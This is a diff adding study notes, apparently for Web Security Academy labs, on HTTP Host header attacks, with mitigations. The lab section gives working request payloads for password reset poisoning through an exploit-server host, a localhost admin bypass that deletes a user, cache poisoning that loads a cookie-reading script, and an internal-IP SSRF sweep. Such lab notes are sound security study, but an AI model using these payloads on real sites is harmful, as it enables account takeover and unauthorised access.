@@ -3670,9 +3670,120 @@ LLM -> API: create_email_forwarding_rule('peter')
   - Repeater > resend with X-Forwarded-Host untill all thress of the dynamic URLs in the resposne point to your exploit server  
 
 ## HTTP Host Header
-Content for HTTP Host Header...
+- The HTTP Host header is a mandatory request header as of HTTP/1.1. It specifies the domain name that the client wants to access.
+- HTTP Host header attack
+  - Web cache poisoning
+  - Business logic flaws in specific functionality
+  - Routing-based SSRF
+  - Classic server-side vulnerabilities, such as SQL injection, XSS, CSRF  
+- Examples
+  ```
+  Example 1: Attacker sends a request with a spoofed Host header value
+  GET /index.html HTTP/1.1
+  Host: www.example.com.attacker.com
+
+  Example 2: Attacker sends a request with a modified Host header value
+  GET /index.html HTTP/1.1
+  Host: www.example.com
+  X-Forwarded-For: attacker.com
+  ```
+**How to test if the application could be vulnerable to Host Header injections**
+- Supply an arbitrary Host header
+- Inject duplicate Host headers
+- Add line wrapping
+- Inject host override headers
+  - X-Forwarded-Host
+  - X-Host
+  - X-Forwarded-Server
+  - X-HTTP-Host-Override Forwarded
+- Supply an absolute URL
+
+**Attack methodology**
+- replace with a malicious `host` header
+  ```
+  GET / HTTP/1.1
+  Host: www.example.com
+  X-Forwarded-Host: www.attacker.com
+  ```
+- analyze the response if it is processing the malicious 'host' header such as redirecting, generating links or resources, or serving content from an unexpected location
+  ```
+  <link src="http://www.attacker.com/link" />
+  ```
+- exploit the vulnerability
+  - web cache
+  - password reset posioning
+  - SSRF
+
+**Mitigation**
+- Validate user input
+- Use a whitelist approach
+- Set the Host header value explicitly in your code isntead of user input
 
 ### HTTP Host Header Lab
+- Basic **password reset poisoning**
+  - Perform forgot password
+  - **Change the host header to an arbitrary value** and still successfully trigger a password reset 
+    `Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
+    ```
+    POST /forgot-password HTTP/2
+    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+
+    csrf=qLvI00QnRs5BH5NGITbFWiciIuQorJQQ&username=carlos
+    ```
+  - Open the access log and retrieve the new token
+  - copy the genuine password reset URL and replace with the new token
+    `https://0a020092041ded658230977c00ab0034.web-security-academy.net/forgot-password?temp-forgot-password-token=isxpfsvpnhktrq4edbcger6o3aovmak7` 
+- **Host header** authentication bypass
+  - change the Host header to an arbitrary value and still successfully access the home page 
+   `Host: localhost`
+    ```
+    GET / HTTP/2
+    Host: example.com
+    ```
+  - able to access admin page by changing the host to `localhost`
+    ```
+    GET /admin HTTP/2
+    Host: localhost
+    ```
+  - delete carlos user
+    ```
+    GET /admin/delete?username=carlos
+    Host: localhost
+    ```
+- Web cache poisoning via **ambiguous request**
+  - Add a second Host header and notice that the arbitrary value of second host header reflected in response
+    ```
+    GET / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+
+    Response
+    <script type="text/javascript" src="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js"></script>
+    ```
+  - Exploit server
+    file: /resources/js/tracking.js
+    body: alert(document.cookie)
+  - Send the requests untill you get a cache hit with your exploit server URL reflected in the response > Alert prompt 
+- Routing-based **SSRF**
+  - 
+- **SSRF** via flawed request parsing
+  - send to intruder
+    - Deselect Update Host header to match target.
+    - Replace the host header with the following IP address
+    - Payloads: Numbers 0 - 255, step 1
+    ```
+    GET /
+    Host: 192.168.0.§0§
+    ```
+  - Resend the request with result of 302 resposne
+    ```
+    GET /admin
+     Host: 192.168.0.81
+    ```
+  - Delete the users
+    `GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
+- **Host validation bypass** via connection state attack
+- **Password reset poisoning via dangling markup (Expert)**
 
 ## OAuth Authentication
 Content for OAuth Authentication...
